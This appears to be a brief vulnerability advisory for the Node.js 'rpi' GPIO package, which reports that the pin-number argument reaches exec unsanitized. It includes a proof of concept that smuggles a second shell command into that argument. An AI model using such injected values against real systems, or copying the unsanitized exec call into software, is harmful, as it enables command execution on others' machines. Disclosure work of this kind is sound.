# Overview

`rpi` is a Node.js library to use the Raspberry Pi GPIOs, this package are vulnerable to Command Injection.

The variable `pinNumbver` in function `GPIO` within `src/lib/gpio.js` is used as part of the argument of `exec` function without any sanitization.

# Proof of Concept

```
var RPI = require("rpi");
var pin = new RPI.GPIO(';touch vulnerable.txt;', '123');
```
